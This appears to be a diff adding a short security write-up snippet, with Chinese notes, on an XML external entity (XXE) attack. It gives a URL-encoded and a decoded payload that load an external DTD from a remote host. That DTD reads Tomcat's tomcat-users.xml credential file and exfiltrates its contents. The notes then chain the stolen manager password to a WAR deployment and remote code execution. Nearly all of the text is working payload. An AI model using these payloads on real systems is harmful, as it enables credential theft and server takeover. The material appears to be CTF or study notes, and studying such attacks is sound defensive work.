@@ -1,0 +1,23 @@
+/?xml=%3C%21DOCTYPE+data+%5B%0D%0A%3C%21ENTITY+%25+dtd+SYSTEM+%22http%3A%2F%2Fkaibro.tw%2Fhey.dtd%22%3E%0D%0A%25dtd%3B%0D%0A%25all%3B%0D%0A%5D%3E%0D%0A%3Croot%3E%26f%3B%3C%2Froot%3E
+
+```
+<!DOCTYPE data [
+ <!ENTITY % dtd SYSTEM "http://kaibro.tw/hey.dtd">
+     %dtd;
+     %all;
+ ]>
+<root>&f;</root>
+```
+
+hey.dtd:
+
+```
+<!ENTITY % file SYSTEM "file:///usr/local/tomcat/conf/tomcat-users.xml">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % all "<!ENTITY f '%start;%file;%end;'>">
+```
+
+=> 可以拿到 tomcat manager 密碼
+=> 部署 war 包
+=> RCE
